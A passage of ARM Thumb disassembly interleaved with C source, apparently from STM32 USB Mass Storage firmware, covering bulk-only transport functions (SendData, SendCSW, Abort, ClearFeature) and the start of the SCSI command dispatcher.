 800973c:	6878      	ldr	r0, [r7, #4]
 800973e:	f000 f873 	bl	8009828 <MSC_BOT_SendCSW>
 8009742:	e02d      	b.n	80097a0 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 8009744:	6878      	ldr	r0, [r7, #4]
 8009746:	f000 f8af 	bl	80098a8 <MSC_BOT_Abort>
 800974a:	e029      	b.n	80097a0 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 800974c:	68fb      	ldr	r3, [r7, #12]
 800974e:	7a1b      	ldrb	r3, [r3, #8]
 8009750:	2b02      	cmp	r3, #2
 8009752:	d024      	beq.n	800979e <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009754:	68fb      	ldr	r3, [r7, #12]
 8009756:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009758:	2b01      	cmp	r3, #1
 800975a:	d020      	beq.n	800979e <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 800975c:	68fb      	ldr	r3, [r7, #12]
 800975e:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009760:	2b03      	cmp	r3, #3
 8009762:	d01c      	beq.n	800979e <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 8009764:	68fb      	ldr	r3, [r7, #12]
 8009766:	68db      	ldr	r3, [r3, #12]
 8009768:	2b00      	cmp	r3, #0
 800976a:	d009      	beq.n	8009780 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 800976c:	68fb      	ldr	r3, [r7, #12]
 800976e:	f103 0110 	add.w	r1, r3, #16
 8009772:	68fb      	ldr	r3, [r7, #12]
 8009774:	68db      	ldr	r3, [r3, #12]
 8009776:	461a      	mov	r2, r3
 8009778:	6878      	ldr	r0, [r7, #4]
 800977a:	f000 f819 	bl	80097b0 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 800977e:	e00f      	b.n	80097a0 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 8009780:	68fb      	ldr	r3, [r7, #12]
 8009782:	68db      	ldr	r3, [r3, #12]
 8009784:	2b00      	cmp	r3, #0
 8009786:	d104      	bne.n	8009792 <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009788:	2100      	movs	r1, #0
 800978a:	6878      	ldr	r0, [r7, #4]
 800978c:	f000 f84c 	bl	8009828 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 8009790:	e006      	b.n	80097a0 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 8009792:	6878      	ldr	r0, [r7, #4]
 8009794:	f000 f888 	bl	80098a8 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 8009798:	e002      	b.n	80097a0 <MSC_BOT_CBW_Decode+0x130>
    return;
 800979a:	bf00      	nop
 800979c:	e000      	b.n	80097a0 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 800979e:	bf00      	nop
    }
  }
}
 80097a0:	3710      	adds	r7, #16
 80097a2:	46bd      	mov	sp, r7
 80097a4:	bd80      	pop	{r7, pc}
 80097a6:	bf00      	nop
 80097a8:	2000010b 	.word	0x2000010b
 80097ac:	43425355 	.word	0x43425355

080097b0 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 80097b0:	b580      	push	{r7, lr}
 80097b2:	b086      	sub	sp, #24
 80097b4:	af00      	add	r7, sp, #0
 80097b6:	60f8      	str	r0, [r7, #12]
 80097b8:	60b9      	str	r1, [r7, #8]
 80097ba:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80097bc:	68fb      	ldr	r3, [r7, #12]
 80097be:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80097c2:	68fb      	ldr	r3, [r7, #12]
 80097c4:	32b0      	adds	r2, #176	; 0xb0
 80097c6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80097ca:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80097cc:	697b      	ldr	r3, [r7, #20]
 80097ce:	2b00      	cmp	r3, #0
 80097d0:	d023      	beq.n	800981a <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 80097d2:	697b      	ldr	r3, [r7, #20]
 80097d4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097d8:	699b      	ldr	r3, [r3, #24]
 80097da:	687a      	ldr	r2, [r7, #4]
 80097dc:	4293      	cmp	r3, r2
 80097de:	bf28      	it	cs
 80097e0:	4613      	movcs	r3, r2
 80097e2:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 80097e4:	697b      	ldr	r3, [r7, #20]
 80097e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097ea:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 80097ec:	687b      	ldr	r3, [r7, #4]
 80097ee:	1ad3      	subs	r3, r2, r3
 80097f0:	697a      	ldr	r2, [r7, #20]
 80097f2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80097f6:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 80097f8:	697b      	ldr	r3, [r7, #20]
 80097fa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097fe:	2200      	movs	r2, #0
 8009800:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 8009804:	697b      	ldr	r3, [r7, #20]
 8009806:	2204      	movs	r2, #4
 8009808:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 800980a:	4b06      	ldr	r3, [pc, #24]	; (8009824 <MSC_BOT_SendData+0x74>)
 800980c:	7819      	ldrb	r1, [r3, #0]
 800980e:	693b      	ldr	r3, [r7, #16]
 8009810:	68ba      	ldr	r2, [r7, #8]
 8009812:	68f8      	ldr	r0, [r7, #12]
 8009814:	f003 fbe4 	bl	800cfe0 <USBD_LL_Transmit>
 8009818:	e000      	b.n	800981c <MSC_BOT_SendData+0x6c>
    return;
 800981a:	bf00      	nop
}
 800981c:	3718      	adds	r7, #24
 800981e:	46bd      	mov	sp, r7
 8009820:	bd80      	pop	{r7, pc}
 8009822:	bf00      	nop
 8009824:	2000010a 	.word	0x2000010a

08009828 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 8009828:	b580      	push	{r7, lr}
 800982a:	b084      	sub	sp, #16
 800982c:	af00      	add	r7, sp, #0
 800982e:	6078      	str	r0, [r7, #4]
 8009830:	460b      	mov	r3, r1
 8009832:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009834:	687b      	ldr	r3, [r7, #4]
 8009836:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800983a:	687b      	ldr	r3, [r7, #4]
 800983c:	32b0      	adds	r2, #176	; 0xb0
 800983e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009842:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009844:	68fb      	ldr	r3, [r7, #12]
 8009846:	2b00      	cmp	r3, #0
 8009848:	d024      	beq.n	8009894 <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 800984a:	68fb      	ldr	r3, [r7, #12]
 800984c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009850:	461a      	mov	r2, r3
 8009852:	4b12      	ldr	r3, [pc, #72]	; (800989c <MSC_BOT_SendCSW+0x74>)
 8009854:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 8009856:	68fb      	ldr	r3, [r7, #12]
 8009858:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800985c:	461a      	mov	r2, r3
 800985e:	78fb      	ldrb	r3, [r7, #3]
 8009860:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 8009864:	68fb      	ldr	r3, [r7, #12]
 8009866:	2200      	movs	r2, #0
 8009868:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 800986a:	4b0d      	ldr	r3, [pc, #52]	; (80098a0 <MSC_BOT_SendCSW+0x78>)
 800986c:	7819      	ldrb	r1, [r3, #0]
 800986e:	68fb      	ldr	r3, [r7, #12]
 8009870:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 8009874:	3210      	adds	r2, #16
 8009876:	230d      	movs	r3, #13
 8009878:	6878      	ldr	r0, [r7, #4]
 800987a:	f003 fbb1 	bl	800cfe0 <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 800987e:	4b09      	ldr	r3, [pc, #36]	; (80098a4 <MSC_BOT_SendCSW+0x7c>)
 8009880:	7819      	ldrb	r1, [r3, #0]
 8009882:	68fb      	ldr	r3, [r7, #12]
 8009884:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009888:	3210      	adds	r2, #16
 800988a:	231f      	movs	r3, #31
 800988c:	6878      	ldr	r0, [r7, #4]
 800988e:	f003 fbdf 	bl	800d050 <USBD_LL_PrepareReceive>
 8009892:	e000      	b.n	8009896 <MSC_BOT_SendCSW+0x6e>
    return;
 8009894:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009896:	3710      	adds	r7, #16
 8009898:	46bd      	mov	sp, r7
 800989a:	bd80      	pop	{r7, pc}
 800989c:	53425355 	.word	0x53425355
 80098a0:	2000010a 	.word	0x2000010a
 80098a4:	2000010b 	.word	0x2000010b

080098a8 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 80098a8:	b580      	push	{r7, lr}
 80098aa:	b084      	sub	sp, #16
 80098ac:	af00      	add	r7, sp, #0
 80098ae:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80098b0:	687b      	ldr	r3, [r7, #4]
 80098b2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80098b6:	687b      	ldr	r3, [r7, #4]
 80098b8:	32b0      	adds	r2, #176	; 0xb0
 80098ba:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80098be:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80098c0:	68fb      	ldr	r3, [r7, #12]
 80098c2:	2b00      	cmp	r3, #0
 80098c4:	d02c      	beq.n	8009920 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 80098c6:	68fb      	ldr	r3, [r7, #12]
 80098c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80098cc:	7f1b      	ldrb	r3, [r3, #28]
 80098ce:	2b00      	cmp	r3, #0
 80098d0:	d10f      	bne.n	80098f2 <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 80098d2:	68fb      	ldr	r3, [r7, #12]
 80098d4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80098d8:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 80098da:	2b00      	cmp	r3, #0
 80098dc:	d009      	beq.n	80098f2 <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 80098de:	68fb      	ldr	r3, [r7, #12]
 80098e0:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 80098e2:	2b00      	cmp	r3, #0
 80098e4:	d105      	bne.n	80098f2 <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80098e6:	4b10      	ldr	r3, [pc, #64]	; (8009928 <MSC_BOT_Abort+0x80>)
 80098e8:	781b      	ldrb	r3, [r3, #0]
 80098ea:	4619      	mov	r1, r3
 80098ec:	6878      	ldr	r0, [r7, #4]
 80098ee:	f003 faa7 	bl	800ce40 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80098f2:	4b0e      	ldr	r3, [pc, #56]	; (800992c <MSC_BOT_Abort+0x84>)
 80098f4:	781b      	ldrb	r3, [r3, #0]
 80098f6:	4619      	mov	r1, r3
 80098f8:	6878      	ldr	r0, [r7, #4]
 80098fa:	f003 faa1 	bl	800ce40 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 80098fe:	68fb      	ldr	r3, [r7, #12]
 8009900:	7a5b      	ldrb	r3, [r3, #9]
 8009902:	2b02      	cmp	r3, #2
 8009904:	d10d      	bne.n	8009922 <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009906:	4b09      	ldr	r3, [pc, #36]	; (800992c <MSC_BOT_Abort+0x84>)
 8009908:	781b      	ldrb	r3, [r3, #0]
 800990a:	4619      	mov	r1, r3
 800990c:	6878      	ldr	r0, [r7, #4]
 800990e:	f003 fa97 	bl	800ce40 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009912:	4b05      	ldr	r3, [pc, #20]	; (8009928 <MSC_BOT_Abort+0x80>)
 8009914:	781b      	ldrb	r3, [r3, #0]
 8009916:	4619      	mov	r1, r3
 8009918:	6878      	ldr	r0, [r7, #4]
 800991a:	f003 fa91 	bl	800ce40 <USBD_LL_StallEP>
 800991e:	e000      	b.n	8009922 <MSC_BOT_Abort+0x7a>
    return;
 8009920:	bf00      	nop
  }
}
 8009922:	3710      	adds	r7, #16
 8009924:	46bd      	mov	sp, r7
 8009926:	bd80      	pop	{r7, pc}
 8009928:	2000010b 	.word	0x2000010b
 800992c:	2000010a 	.word	0x2000010a

08009930 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009930:	b580      	push	{r7, lr}
 8009932:	b084      	sub	sp, #16
 8009934:	af00      	add	r7, sp, #0
 8009936:	6078      	str	r0, [r7, #4]
 8009938:	460b      	mov	r3, r1
 800993a:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800993c:	687b      	ldr	r3, [r7, #4]
 800993e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009942:	687b      	ldr	r3, [r7, #4]
 8009944:	32b0      	adds	r2, #176	; 0xb0
 8009946:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800994a:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800994c:	68fb      	ldr	r3, [r7, #12]
 800994e:	2b00      	cmp	r3, #0
 8009950:	d01d      	beq.n	800998e <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 8009952:	68fb      	ldr	r3, [r7, #12]
 8009954:	7a5b      	ldrb	r3, [r3, #9]
 8009956:	2b02      	cmp	r3, #2
 8009958:	d10c      	bne.n	8009974 <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800995a:	4b10      	ldr	r3, [pc, #64]	; (800999c <MSC_BOT_CplClrFeature+0x6c>)
 800995c:	781b      	ldrb	r3, [r3, #0]
 800995e:	4619      	mov	r1, r3
 8009960:	6878      	ldr	r0, [r7, #4]
 8009962:	f003 fa6d 	bl	800ce40 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009966:	4b0e      	ldr	r3, [pc, #56]	; (80099a0 <MSC_BOT_CplClrFeature+0x70>)
 8009968:	781b      	ldrb	r3, [r3, #0]
 800996a:	4619      	mov	r1, r3
 800996c:	6878      	ldr	r0, [r7, #4]
 800996e:	f003 fa67 	bl	800ce40 <USBD_LL_StallEP>
 8009972:	e00f      	b.n	8009994 <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 8009974:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8009978:	2b00      	cmp	r3, #0
 800997a:	da0a      	bge.n	8009992 <MSC_BOT_CplClrFeature+0x62>
 800997c:	68fb      	ldr	r3, [r7, #12]
 800997e:	7a5b      	ldrb	r3, [r3, #9]
 8009980:	2b01      	cmp	r3, #1
 8009982:	d006      	beq.n	8009992 <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009984:	2101      	movs	r1, #1
 8009986:	6878      	ldr	r0, [r7, #4]
 8009988:	f7ff ff4e 	bl	8009828 <MSC_BOT_SendCSW>
 800998c:	e002      	b.n	8009994 <MSC_BOT_CplClrFeature+0x64>
    return;
 800998e:	bf00      	nop
 8009990:	e000      	b.n	8009994 <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 8009992:	bf00      	nop
  }
}
 8009994:	3710      	adds	r7, #16
 8009996:	46bd      	mov	sp, r7
 8009998:	bd80      	pop	{r7, pc}
 800999a:	bf00      	nop
 800999c:	2000010a 	.word	0x2000010a
 80099a0:	2000010b 	.word	0x2000010b

080099a4 <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 80099a4:	b580      	push	{r7, lr}
 80099a6:	b086      	sub	sp, #24
 80099a8:	af00      	add	r7, sp, #0
 80099aa:	60f8      	str	r0, [r7, #12]
 80099ac:	460b      	mov	r3, r1
 80099ae:	607a      	str	r2, [r7, #4]
 80099b0:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80099b2:	68fb      	ldr	r3, [r7, #12]
 80099b4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80099b8:	68fb      	ldr	r3, [r7, #12]
 80099ba:	32b0      	adds	r2, #176	; 0xb0
 80099bc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80099c0:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 80099c2:	693b      	ldr	r3, [r7, #16]
 80099c4:	2b00      	cmp	r3, #0
 80099c6:	d102      	bne.n	80099ce <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 80099c8:	f04f 33ff 	mov.w	r3, #4294967295
 80099cc:	e168      	b.n	8009ca0 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 80099ce:	687b      	ldr	r3, [r7, #4]
 80099d0:	781b      	ldrb	r3, [r3, #0]
 80099d2:	2baa      	cmp	r3, #170	; 0xaa
 80099d4:	f000 8144 	beq.w	8009c60 <SCSI_ProcessCmd+0x2bc>
 80099d8:	2baa      	cmp	r3, #170	; 0xaa
 80099da:	f300 8153 	bgt.w	8009c84 <SCSI_ProcessCmd+0x2e0>
 80099de:	2ba8      	cmp	r3, #168	; 0xa8
 80099e0:	f000 812c 	beq.w	8009c3c <SCSI_ProcessCmd+0x298>
 80099e4:	2ba8      	cmp	r3, #168	; 0xa8
 80099e6:	f300 814d 	bgt.w	8009c84 <SCSI_ProcessCmd+0x2e0>
 80099ea:	2b5a      	cmp	r3, #90	; 0x5a
 80099ec:	f300 80c0 	bgt.w	8009b70 <SCSI_ProcessCmd+0x1cc>
 80099f0:	2b00      	cmp	r3, #0
 80099f2:	f2c0 8147 	blt.w	8009c84 <SCSI_ProcessCmd+0x2e0>
 80099f6:	2b5a      	cmp	r3, #90	; 0x5a
 80099f8:	f200 8144 	bhi.w	8009c84 <SCSI_ProcessCmd+0x2e0>
 80099fc:	a201      	add	r2, pc, #4	; (adr r2, 8009a04 <SCSI_ProcessCmd+0x60>)
 80099fe:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8009a02:	bf00      	nop
 8009a04:	08009b77 	.word	0x08009b77
 8009a08:	08009c85 	.word	0x08009c85
 8009a0c:	08009c85 	.word	0x08009c85
 8009a10:	08009b89 	.word	0x08009b89
 8009a14:	08009c85 	.word	0x08009c85
 8009a18:	08009c85 	.word	0x08009c85
 8009a1c:	08009c85 	.word	0x08009c85
 8009a20:	08009c85 	.word	0x08009c85
 8009a24:	08009c85 	.word	0x08009c85
 8009a28:	08009c85 	.word	0x08009c85
 8009a2c:	08009c85 	.word	0x08009c85
 8009a30:	08009c85 	.word	0x08009c85
 8009a34:	08009c85 	.word	0x08009c85
 8009a38:	08009c85 	.word	0x08009c85
 8009a3c:	08009c85 	.word	0x08009c85
 8009a40:	08009c85 	.word	0x08009c85
 8009a44:	08009c85 	.word	0x08009c85
 8009a48:	08009c85 	.word	0x08009c85
 8009a4c:	08009b9b 	.word	0x08009b9b
 8009a50:	08009c85 	.word	0x08009c85
 8009a54:	08009c85 	.word	0x08009c85
 8009a58:	08009c85 	.word	0x08009c85
 8009a5c:	08009c85 	.word	0x08009c85
 8009a60:	08009c85 	.word	0x08009c85
 8009a64:	08009c85 	.word	0x08009c85
 8009a68:	08009c85 	.word	0x08009c85
 8009a6c:	08009bd1 	.word	0x08009bd1
 8009a70:	08009bad 	.word	0x08009bad
 8009a74:	08009c85 	.word	0x08009c85
 8009a78:	08009c85 	.word	0x08009c85
 8009a7c:	08009bbf 	.word	0x08009bbf
 8009a80:	08009c85 	.word	0x08009c85
 8009a84:	08009c85 	.word	0x08009c85
 8009a88:	08009c85 	.word	0x08009c85
 8009a8c:	08009c85 	.word	0x08009c85
 8009a90:	08009bf5 	.word	0x08009bf5
 8009a94:	08009c85 	.word	0x08009c85
 8009a98:	08009c07 	.word	0x08009c07
 8009a9c:	08009c85 	.word	0x08009c85
 8009aa0:	08009c85 	.word	0x08009c85
 8009aa4:	08009c2b 	.word	0x08009c2b
 8009aa8:	08009c85 	.word	0x08009c85
 8009aac:	08009c4f 	.word	0x08009c4f
 8009ab0:	08009c85 	.word	0x08009c85
 8009ab4:	08009c85 	.word	0x08009c85
 8009ab8:	08009c85 	.word	0x08009c85
 8009abc:	08009c85 	.word	0x08009c85
 8009ac0:	08009c73 	.word	0x08009c73
 8009ac4:	08009c85 	.word	0x08009c85
 8009ac8:	08009c85 	.word	0x08009c85
 8009acc:	08009c85 	.word	0x08009c85
 8009ad0:	08009c85 	.word	0x08009c85
 8009ad4:	08009c85 	.word	0x08009c85
 8009ad8:	08009c85 	.word	0x08009c85
 8009adc:	08009c85 	.word	0x08009c85
 8009ae0:	08009c85 	.word	0x08009c85
 8009ae4:	08009c85 	.word	0x08009c85
 8009ae8:	08009c85 	.word	0x08009c85
 8009aec:	08009c85 	.word	0x08009c85
 8009af0:	08009c85 	.word	0x08009c85
 8009af4:	08009c85 	.word	0x08009c85
 8009af8:	08009c85 	.word	0x08009c85
 8009afc:	08009c85 	.word	0x08009c85
 8009b00:	08009c85 	.word	0x08009c85
 8009b04:	08009c85 	.word	0x08009c85
 8009b08:	08009c85 	.word	0x08009c85
 8009b0c:	08009c85 	.word	0x08009c85
 8009b10:	08009c85 	.word	0x08009c85
 8009b14:	08009c85 	.word	0x08009c85
 8009b18:	08009c85 	.word	0x08009c85
 8009b1c:	08009c85 	.word	0x08009c85
 8009b20:	08009c85 	.word	0x08009c85
 8009b24:	08009c85 	.word	0x08009c85
 8009b28:	08009c85 	.word	0x08009c85
 8009b2c:	08009c85 	.word	0x08009c85
 8009b30:	08009c85 	.word	0x08009c85
 8009b34:	08009c85 	.word	0x08009c85
 8009b38:	08009c85 	.word	0x08009c85
 8009b3c:	08009c85 	.word	0x08009c85
 8009b40:	08009c85 	.word	0x08009c85
 8009b44:	08009c85 	.word	0x08009c85
 8009b48:	08009c85 	.word	0x08009c85
 8009b4c:	08009c85 	.word	0x08009c85
 8009b50:	08009c85 	.word	0x08009c85
 8009b54:	08009c85 	.word	0x08009c85
 8009b58:	08009c85 	.word	0x08009c85
 8009b5c:	08009c85 	.word	0x08009c85
 8009b60:	08009c85 	.word	0x08009c85
 8009b64:	08009c85 	.word	0x08009c85
 8009b68:	08009c85 	.word	0x08009c85
 8009b6c:	08009be3 	.word	0x08009be3
 8009b70:	2b9e      	cmp	r3, #158	; 0x9e
 8009b72:	d051      	beq.n	8009c18 <SCSI_ProcessCmd+0x274>
 8009b74:	e086      	b.n	8009c84 <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 8009b76:	7afb      	ldrb	r3, [r7, #11]
 8009b78:	687a      	ldr	r2, [r7, #4]
 8009b7a:	4619      	mov	r1, r3
 8009b7c:	68f8      	ldr	r0, [r7, #12]
 8009b7e:	f000 f893 	bl	8009ca8 <SCSI_TestUnitReady>
 8009b82:	4603      	mov	r3, r0
 8009b84:	75fb      	strb	r3, [r7, #23]
      break;
 8009b86:	e089      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009b88:	7afb      	ldrb	r3, [r7, #11]
 8009b8a:	687a      	ldr	r2, [r7, #4]
 8009b8c:	4619      	mov	r1, r3
 8009b8e:	68f8      	ldr	r0, [r7, #12]
 8009b90:	f000 fb9a 	bl	800a2c8 <SCSI_RequestSense>
 8009b94:	4603      	mov	r3, r0
 8009b96:	75fb      	strb	r3, [r7, #23]
      break;
 8009b98:	e080      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 8009b9a:	7afb      	ldrb	r3, [r7, #11]
 8009b9c:	687a      	ldr	r2, [r7, #4]
 8009b9e:	4619      	mov	r1, r3
 8009ba0:	68f8      	ldr	r0, [r7, #12]
 8009ba2:	f000 f8df 	bl	8009d64 <SCSI_Inquiry>
 8009ba6:	4603      	mov	r3, r0
 8009ba8:	75fb      	strb	r3, [r7, #23]
      break;
 8009baa:	e077      	b.n	8009c9c <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 8009bac:	7afb      	ldrb	r3, [r7, #11]
 8009bae:	687a      	ldr	r2, [r7, #4]
 8009bb0:	4619      	mov	r1, r3
 8009bb2:	68f8      	ldr	r0, [r7, #12]
 8009bb4:	f000 fc7e 	bl	800a4b4 <SCSI_StartStopUnit>
 8009bb8:	4603      	mov	r3, r0
 8009bba:	75fb      	strb	r3, [r7, #23]
      break;
